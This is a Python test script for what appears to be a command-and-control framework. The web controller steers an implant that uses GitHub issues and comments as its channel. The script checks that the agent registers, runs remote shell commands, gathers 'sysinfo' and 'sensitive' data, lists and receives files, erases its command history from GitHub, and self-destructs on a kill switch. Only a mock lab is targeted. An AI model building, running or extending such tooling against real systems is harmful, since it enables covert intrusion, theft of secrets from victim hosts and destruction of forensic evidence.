"""
Full-loop feature matrix — drives the web controller HTTP API exactly the way
the browser UI does, against a lab stack of:

    agent (musl, C2_LAB)  ↔  mock SaaS (:8480)  ↔  web controller (:8081)

Every step prints PASS/FAIL; any FAIL exits non-zero at the end.

Usage:
    python3 feature_matrix.py <ctrl_base> <web_user> <web_password> <c2_password>

The C2 password must be the golden-vector password (test_crypto.PWD) so it
matches the agent launched by lab_run_agent.py. All credentials arrive via
argv (owned by the shell harness) — no literals in this file.
"""
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar

CTRL   = sys.argv[1].rstrip("/")
USER   = sys.argv[2]
WEBPWD = sys.argv[3]
C2PWD  = sys.argv[4]

# Real-environment overrides (lab on a live server); defaults suit the mock lab.
GH_TOKEN  = os.environ.get("C2_GITHUB_TOKEN", "mock-token")
GH_REPO   = os.environ.get("C2_GITHUB_REPO", "test/lab")

_results = []


def check(name, ok, detail=""):
    _results.append((name, ok))
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f" — {detail}" if detail else ""), flush=True)


def wait_for(fn, timeout, desc, interval=2):
    """Poll fn() until truthy or timeout; returns last value."""
    deadline = time.time() + timeout
    v = None
    while time.time() < deadline:
        try:
            v = fn()
        except Exception as e:  # transient poll errors are fine
            v = None
            print(f"      (poll error: {e})", flush=True)
        if v:
            return v
        time.sleep(interval)
    return v


class Client:
    """Tiny cookie-session HTTP client (same calls the frontend makes)."""

    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar))

    def req(self, method, path, data=None, form=None, timeout=20):
        url = path if path.startswith("http") else CTRL + path
        headers = {}
        body = None
        if data is not None:
            body    = json.dumps(data).encode()
            headers["Content-Type"] = "application/json"
        if form is not None:
            body, hdr = multipart(form)
            headers.update(hdr)
        r = urllib.request.Request(url, data=body, headers=headers, method=method)
        try:
            resp = self.op.open(r, timeout=timeout)
            return resp.status, json.loads(resp.read().decode() or "{}")
        except urllib.error.HTTPError as e:
            try:
                return e.code, json.loads(e.read().decode() or "{}")
            except Exception:
                return e.code, {}

    def get(self, path):
        return self.req("GET", path)

    def post(self, path, data=None):
        return self.req("POST", path, data=data)


def agent_rows(body):
    """GET /api/agents 现返回 {agents, warnings}，兼容旧的纯数组。"""
    if isinstance(body, list):
        return body
    return (body or {}).get("agents") or []


def multipart(form):
    """Minimal multipart/form-data encoder for the upload endpoint."""
    boundary = "----c2labboundary7351"
    parts = []
    for k, v in form.items():
        if isinstance(v, tuple):          # (filename, bytes)
            fn, blob = v
            parts.append(
                f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"; '
                f'filename="{fn}"\r\nContent-Type: application/octet-stream\r\n\r\n'
                .encode() + blob + b"\r\n")
        else:
            parts.append(
                f'--{boundary}\r\nContent-Disposition: form-data; name="{k}"'
                f'\r\n\r\n{v}\r\n'.encode())
    parts.append(f"--{boundary}--\r\n".encode())
    return b"".join(parts), {"Content-Type": f"multipart/form-data; boundary={boundary}"}


def form_login(user, pwd):
    """Form-encoded login like the browser UI; returns (ok, client)."""
    cl  = Client()
    bod = urllib.parse.urlencode({"username": user, "password": pwd}).encode()
    r   = urllib.request.Request(CTRL + "/login", data=bod, headers={
        "Content-Type": "application/x-www-form-urlencoded"})
    resp = cl.op.open(r)
    return ("/login" not in resp.url), cl


# ── matrix ──────────────────────────────────────────────────────────────────

# 1. login rejects an invalid credential, accepts the right one (also seeds
#    the login_failed audit entry asserted below)
bad_ok, _ = form_login(USER, WEBPWD + "-invalid")
check("login rejects bad password", not bad_ok)

ok, c = form_login(USER, WEBPWD)
check("login accepts credentials", ok)

# 2. save settings (tokens / repos / password) → controller connects to mock
#    (worker-channel runs reuse the controller's saved settings instead)
if not os.environ.get("C2_SKIP_SETTINGS"):
    st, d = c.post("/api/settings", {
        "github_token":  GH_TOKEN,          # comma-joined string, same as the UI
        "password":      C2PWD,
        "github_repos":  [GH_REPO],
        "poll_interval": int(os.environ.get("C2_POLL", "5")),
    })
    check("settings save", st == 200 and d.get("ok"), json.dumps(d)[:120])
else:
    check("settings save (skipped, worker run)", True)

# 3. agent shows up (registered through mock issue creation)
if os.environ.get("C2_CHANNEL") == "worker":
    agents = wait_for(lambda: (lambda a: a if a else None)(
        [x for x in agent_rows(c.get("/api/agents")[1])
         if x.get("channel") == "worker" and "probe" not in x["id"]]), 120,
        "agent registration (worker channel)")
else:
    agents = wait_for(lambda: (lambda a: a if a else None)(
        [x for x in agent_rows(c.get("/api/agents")[1]) if x.get("repo") == GH_REPO]), 90,
        "agent registration")
check("agent registered", bool(agents), f"{len(agents or [])} agent(s)")
if not agents:
    print("agent never registered — aborting matrix", flush=True)
    sys.exit(1)
A   = agents[0]
AID = A["id"]
print(f"      agent: {A.get('hostname')} / {A.get('os')} / {A.get('privilege')} / id={AID}", flush=True)


def msgs():
    return c.get(f"/api/messages/{AID}")[1].get("messages", [])


def send(cmd):
    st, d = c.post("/api/command", {"agent_id": AID, "command": cmd})
    if st != 200 or not d.get("command_id"):
        print(f"      send failed: {st} {d}", flush=True)
    return d.get("command_id")


def wait_response(substr, timeout=60, contains=True):
    def look():
        for m in msgs():
            if m.get("is_command"):
                continue
            txt = m.get("content", "")
            if (substr in txt) if contains else (substr not in txt):
                return txt
        return None
    return wait_for(look, timeout, f"response {substr!r}")


# 4. plain command round-trip
send("id -un; uname -a")
resp = wait_response("Linux", 60)
check("command round-trip", bool(resp),
      (resp or "").strip().splitlines()[:1][0][:100] if resp else "no response")

# 5. chunked response reassembly (seq 1 9000 ≈ 57 KB → multiple 45 KB parts)
send("seq 1 9000")
chunked = wait_response("9000", 120)
ok5 = bool(chunked) and "\n8999\n9000" in "\n" + chunked
check("chunked response reassembled", ok5,
      f"{len(chunked or '')} chars, tail={repr((chunked or '')[-12:])}")

# 6. sysinfo
send("sysinfo")
si = wait_for(lambda: (c.get(f"/api/sysinfo/{AID}")[1].get("latest") or {}).get("content"), 90,
              "sysinfo snapshot")
check("sysinfo collected", bool(si) and any(k in (si or "") for k in ("Hostname", "OS", "kernel", "Linux")),
      f"{len(si or '')} chars")

# 7. sensitive
send("sensitive")
sen = wait_for(lambda: (c.get(f"/api/sensitive/{AID}")[1].get("latest") or {}).get("content"), 90,
               "sensitive snapshot")
check("sensitive collected", bool(sen), f"{len(sen or '')} chars")

# 8. file listing
send("ls /tmp")
fl = wait_for(lambda: (lambda e: e if e else None)(
    c.get(f"/api/files/{AID}?path=/tmp")[1].get("entries")), 60, "file list")
check("file listing", isinstance(fl, list) and len(fl) > 0, f"{len(fl or [])} entries")

# 9. upload a file to the agent (multipart → chunked issue transport)
blob = b"c2-lab-upload-" + b"x" * 8192 + b"\n"
st, d = c.req("POST", "/api/files/upload", form={
    "agent_id":  AID,
    "dest_path": "/tmp",
    "file":      ("lab_upload.txt", blob),
})
check("upload accepted", st == 200 and d.get("ok"), json.dumps(d)[:120])
# entries cache only refreshes when a fresh `ls` is sent (same as the UI)
send("ls /tmp")
up = wait_for(lambda: (lambda e: e and [x for x in e if x.get("name") == "lab_upload.txt"] or None)(
    c.get(f"/api/files/{AID}?path=/tmp")[1].get("entries")), 120, "uploaded file appears")
check("uploaded file visible on agent", bool(up),
      f"size={up[0].get('size') if up else '?'}")

# 10. read the uploaded file back (content check)
send("cat /tmp/lab_upload.txt")
back = wait_response("c2-lab-upload-", 60)
check("uploaded content readable", bool(back) and "xxxxxxxx" in (back or ""))

# 11. stats endpoint sanity
st, d = c.get("/api/stats")
check("stats counts", st == 200 and d.get("commands_24h", 0) >= 8 and d.get("messages_24h", 0) >= 8,
      f"cmds24h={d.get('commands_24h')} msgs24h={d.get('messages_24h')}")

# 12. audit trail
st, d = c.get("/api/audit?limit=50")
acts = [e.get("action") for e in d.get("entries", [])]
check("audit trail", st == 200 and "command" in acts and "login_failed" in acts,
      f"{len(acts)} entries, sample={acts[:5]}")

# 13. history clear for this agent (deletes every GitHub comment — slow,
# N sequential DELETEs — allow 180 s and never abort the matrix here)
try:
    st, d = c.req("POST", "/api/history/clear", data={"agent_id": AID}, timeout=180)
    check("history clear", st == 200 and d.get("ok"))
except Exception as e:
    check("history clear", False, f"{type(e).__name__}: {e}")

# 14. kill switch — agent self-destructs on next poll
try:
    st, d = c.req("POST", "/api/killswitch/activate", data={}, timeout=60)
    check("killswitch issued", st == 200 and d.get("ok"), json.dumps(d)[:160])
except Exception as e:
    check("killswitch issued", False, f"{type(e).__name__}: {e}")
    st, d = {"ok": True}, {}
if not d.get("ok"):
    print("killswitch failed — skipping agent-death probe", flush=True)
    _results.append(("agent dead after killswitch", False))
else:
    # agent should stop responding; probe with a command that will never answer
    send("echo should-never-answer-7f3a")
    time.sleep(15)   # let at least one poll cycle pass
    no_resp = wait_response("should-never-answer-7f3a", 40, contains=True)
    check("agent dead after killswitch", not no_resp,
          "agent still responding" if no_resp else "no further responses")

# ── summary ────────────────────────────────────────────────────────────────
fails = [n for n, ok in _results if not ok]
print(f"\n===== feature matrix: {len(_results) - len(fails)}/{len(_results)} passed =====", flush=True)
if fails:
    print("FAILED:", ", ".join(fails), flush=True)
    sys.exit(1)
